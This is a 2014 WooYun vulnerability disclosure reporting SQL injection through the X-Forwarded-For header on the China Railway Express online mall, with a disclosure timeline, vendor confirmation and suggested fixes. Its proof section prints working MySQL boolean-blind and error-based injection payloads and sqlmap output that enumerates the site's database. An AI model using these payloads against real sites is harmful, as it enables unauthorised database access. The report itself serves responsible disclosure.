wybug_title: 铁道部旗下中铁快运商城注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-05-09：	细节已通知厂商并且等待厂商处理中									2014-05-13：	厂商已经确认，细节仅向厂商公开									2014-05-23：	细节向核心白帽子及相关领域专家公开									2014-06-02：	细节向普通白帽子公开									2014-06-12：	细节向实习白帽子公开									2014-06-23：	细节向公众公开  简要描述： 铁道部旗下中铁快运商城注入漏洞，报错注入 详细说明：  注入点在http header的X-Forwarded-For字段访问http://mall.95572.com/，fiddler断点截包，在请求头上加入X-Forwarded-For: 192.168.1.1'，可以看到报错信息



   漏洞证明：  还是拿sqlmap跑一下，省时省力：(custom) HEADER parameter 'X-Forwarded-For #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection points with a total of 287 HTTP(s) requests:---Place: (custom) HEADERParameter: X-Forwarded-For #1*    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: 192.168.1.1' RLIKE IF(6611=6611,0x4d7953514c,0x28) AND 'AWSL'='AWSL    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)    Payload: 192.168.1.1' AND EXTRACTVALUE(6240,CONCAT(0x5c,0x7167776371,(SELECT (CASE WHEN (6240=6240) THEN 1 ELSE 0 END)),0x717a786971)) AND 'XFBT'='XFBT---[17:36:45] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.14, Apache 2.2.15back-end DBMS: MySQL 5.1[17:36:45] [INFO] fetching database names[17:36:45] [WARNING] the SQL query provided does not return any output[17:36:45] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[17:36:45] [INFO] fetching number of databases[17:36:45] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[17:36:45] [INFO] retrieved: [17:36:45] [ERROR] unable to retrieve the number of databases[17:36:45] [INFO] falling back to current database[17:36:45] [INFO] fetching current database[17:36:45] [INFO] retrieved: shopncavailable databases [1]:[*] shopnc只爆出当前数据库，= =！     修复方案：  过滤，参数化   版权声明：转载请注明来源 greg.wu@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-13 18:04 厂商回复： CNVD确认并复现所述情况，由CNVD通过公开联系渠道向网站管理单位通报。 最新状态： 暂无
